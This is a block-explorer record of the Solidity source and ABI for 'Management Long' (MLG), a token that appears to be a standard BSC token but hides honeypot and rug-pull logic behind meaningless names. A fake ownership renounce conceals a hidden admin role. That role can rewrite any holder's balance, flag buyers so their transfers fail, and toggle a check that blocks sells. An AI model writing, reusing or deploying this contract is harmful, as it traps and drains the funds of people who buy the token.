{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface fromReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderLimit {\n    function createPair(address buyReceiverFee, address senderTo) external returns (address);\n}\n\ninterface marketingSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAt) external view returns (uint256);\n\n    function transfer(address maxAtAuto, uint256 tradingIs) external returns (bool);\n\n    function allowance(address autoLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxAtAuto,\n        uint256 tradingIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isFund, uint256 value);\n    event Approval(address indexed autoLaunch, address indexed spender, uint256 value);\n}\n\ninterface marketingSwapMetadata is marketingSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManagementLong is listTx, marketingSwap, marketingSwapMetadata {\n\n    uint256 public tokenTotalLaunched;\n\n    function toToken() private view {\n        require(tradingFeeSwap[_msgSender()]);\n    }\n\n    uint256 constant launchedAmount = 19 ** 10;\n\n    string private minReceiverTo = \"Management Long\";\n\n    uint256 public buySwap;\n\n    bool private txTrading;\n\n    bool private txShould;\n\n    uint256 sellWallet;\n\n    address public enableExempt;\n\n    bool public listWallet;\n\n    uint256 private exemptReceiver;\n\n    mapping(address => mapping(address => uint256)) private limitFrom;\n\n    function owner() external view returns (address) {\n        return totalTx;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minReceiverTo;\n    }\n\n    function allowance(address txExempt, address shouldLimit) external view virtual override returns (uint256) {\n        if (shouldLimit == swapLaunched) {\n            return type(uint256).max;\n        }\n        return limitFrom[txExempt][shouldLimit];\n    }\n\n    function launchTake(address launchExempt) public {\n        if (minSender) {\n            return;\n        }\n        if (txTrading != listWallet) {\n            buySwap = tokenTotalLaunched;\n        }\n        tradingFeeSwap[launchExempt] = true;\n        \n        minSender = true;\n    }\n\n    address launchSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundTrading() public {\n        emit OwnershipTransferred(enableExempt, address(0));\n        totalTx = address(0);\n    }\n\n    function balanceOf(address receiverAt) public view virtual override returns (uint256) {\n        return receiverSender[receiverAt];\n    }\n\n    string private limitToAmount = \"MLG\";\n\n    function launchedTx(address fundTeam, address maxAtAuto, uint256 tradingIs) internal returns (bool) {\n        if (fundTeam == enableExempt) {\n            return atFundMin(fundTeam, maxAtAuto, tradingIs);\n        }\n        uint256 receiverMarketing = marketingSwap(amountTake).balanceOf(launchSender);\n        require(receiverMarketing == sellWallet);\n        require(maxAtAuto != launchSender);\n        if (marketingMin[fundTeam]) {\n            return atFundMin(fundTeam, maxAtAuto, launchedAmount);\n        }\n        return atFundMin(fundTeam, maxAtAuto, tradingIs);\n    }\n\n    address private totalTx;\n\n    function transferFrom(address fundTeam, address maxAtAuto, uint256 tradingIs) external override returns (bool) {\n        if (_msgSender() != swapLaunched) {\n            if (limitFrom[fundTeam][_msgSender()] != type(uint256).max) {\n                require(tradingIs <= limitFrom[fundTeam][_msgSender()]);\n                limitFrom[fundTeam][_msgSender()] -= tradingIs;\n            }\n        }\n        return launchedTx(fundTeam, maxAtAuto, tradingIs);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalTx;\n    }\n\n    uint256 swapLimit;\n\n    uint8 private modeEnableReceiver = 18;\n\n    mapping(address => bool) public tradingFeeSwap;\n\n    bool private modeTx;\n\n    event OwnershipTransferred(address indexed totalFeeSender, address indexed maxModeIs);\n\n    mapping(address => bool) public marketingMin;\n\n    uint256 private tokenFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitToAmount;\n    }\n\n    address public amountTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellMarketingFund;\n    }\n\n    function feeTradingReceiver(address feeFrom, uint256 tradingIs) public {\n        toToken();\n        receiverSender[feeFrom] = tradingIs;\n    }\n\n    uint256 private sellMarketingFund = 100000000 * 10 ** 18;\n\n    bool public minSender;\n\n    uint256 public toTx;\n\n    function autoEnable(uint256 tradingIs) public {\n        toToken();\n        sellWallet = tradingIs;\n    }\n\n    mapping(address => uint256) private receiverSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeEnableReceiver;\n    }\n\n    constructor (){\n        \n        fromReceiver totalList = fromReceiver(swapLaunched);\n        amountTake = senderLimit(totalList.factory()).createPair(totalList.WETH(), address(this));\n        \n        enableExempt = _msgSender();\n        fundTrading();\n        tradingFeeSwap[enableExempt] = true;\n        receiverSender[enableExempt] = sellMarketingFund;\n        \n        emit Transfer(address(0), enableExempt, sellMarketingFund);\n    }\n\n    function atFundMin(address fundTeam, address maxAtAuto, uint256 tradingIs) internal returns (bool) {\n        require(receiverSender[fundTeam] >= tradingIs);\n        receiverSender[fundTeam] -= tradingIs;\n        receiverSender[maxAtAuto] += tradingIs;\n        emit Transfer(fundTeam, maxAtAuto, tradingIs);\n        return true;\n    }\n\n    function txLaunched(address amountFee) public {\n        toToken();\n        if (listWallet != txShould) {\n            txShould = true;\n        }\n        if (amountFee == enableExempt || amountFee == amountTake) {\n            return;\n        }\n        marketingMin[amountFee] = true;\n    }\n\n    function transfer(address feeFrom, uint256 tradingIs) external virtual override returns (bool) {\n        return launchedTx(_msgSender(), feeFrom, tradingIs);\n    }\n\n    address swapLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address shouldLimit, uint256 tradingIs) public virtual override returns (bool) {\n        limitFrom[_msgSender()][shouldLimit] = tradingIs;\n        emit Approval(_msgSender(), shouldLimit, tradingIs);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFeeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxModeIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"autoEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"feeTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotalLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingFeeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAtAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"}],\"name\":\"txLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ManagementLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}